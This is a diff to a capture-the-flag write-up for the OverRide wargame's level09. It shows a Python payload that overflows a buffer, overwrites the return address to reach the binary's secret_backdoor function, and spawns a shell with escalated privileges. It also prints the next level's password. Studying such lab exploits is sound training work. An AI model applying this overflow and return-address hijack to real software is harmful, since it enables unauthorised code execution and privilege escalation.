@@ -189,6 +189,52 @@ let's check were is it.
 adress end of rip address	- buf msg start			= size we need for replace rip
 0x7fffffffe5cf 			- 0x7fffffffe500		= 0xcf
 
+Ok let's try to segfault with that:
+
+level09@OverRide:~$ python -c 'print "A" * 40 + "\xcf" + "\n" + "B" * 200 + "CCCC"' > /tmp/input && cat /tmp/input | ./level09 
+--------------------------------------------
+|   ~Welcome to l33t-m$n ~    v1337        |
+--------------------------------------------
+>: Enter your username
+>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�>: Msg @Unix-Dude
+>>: >: Msg sent!
+Segmentation fault (core dumped)
+level09@OverRide:~$ dmesg | tail -1
+[16079.644063] level09[3018]: segfault at a43434343 ip 0000000a43434343 sp 00007fffffffe5e0 error 14 in level09[555555554000+1000]
+
+
+yes perfect we can control rip. we need to find something to redirect.
+
+
+(gdb) info function
+All defined functions:
+
+Non-debugging symbols:
+		....
+0x000055555555488c  secret_backdoor
+		....
+
+(gdb) disass secret_backdoor 
+Dump of assembler code for function secret_backdoor:
+   0x000055555555488c <+0>:	push   %rbp
+   0x000055555555488d <+1>:	mov    %rsp,%rbp
+   0x0000555555554890 <+4>:	add    $0xffffffffffffff80,%rsp
+   0x0000555555554894 <+8>:	mov    0x20171d(%rip),%rax        # 0x555555755fb8
+   0x000055555555489b <+15>:	mov    (%rax),%rax
+   0x000055555555489e <+18>:	mov    %rax,%rdx
+   0x00005555555548a1 <+21>:	lea    -0x80(%rbp),%rax
+   0x00005555555548a5 <+25>:	mov    $0x80,%esi
+   0x00005555555548aa <+30>:	mov    %rax,%rdi
+   0x00005555555548ad <+33>:	callq  0x555555554770 <fgets@plt>
+   0x00005555555548b2 <+38>:	lea    -0x80(%rbp),%rax
+   0x00005555555548b6 <+42>:	mov    %rax,%rdi
+   0x00005555555548b9 <+45>:	callq  0x555555554740 <system@plt>
+   0x00005555555548be <+50>:	leaveq 
+   0x00005555555548bf <+51>:	retq   
+End of assembler dump.
+
+Ok nice, it should work with that.
+
 So let's try with gdb to see.
 
 python -c 'print "A" * 40 + "\xcf" +"\n"+ "B" * 200 + "\x8c\x48\x55\x55\x55\x55\x00\x00"' > /tmp/input
@@ -236,3 +282,17 @@ level09@OverRide:~$ python -c 'print "A" * 40 + "\xcf" +"\n"+ "B" * 200 + "\x8c\
 cat /home/users/end/.pass
 j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
 
+
+We can add /bin/sh to get a shell:
+
+level09@OverRide:~$ python -c 'print "A" * 40 + "\xcf" +"\n"+ "B" * 200 + "\x8c\x48\x55\x55\x55\x55\x00\x00" + "\n/bin/sh"' > /tmp/input && cat /tmp/input - |  ./level09
+--------------------------------------------
+|   ~Welcome to l33t-m$n ~    v1337        |
+--------------------------------------------
+>: Enter your username
+>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�>: Msg @Unix-Dude
+>>: >: Msg sent!
+id
+uid=1010(level09) gid=1010(level09) euid=1009(end) egid=100(users) groups=1009(end),100(users),1010(level09)
+cat /home/users/end/.pass
+j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
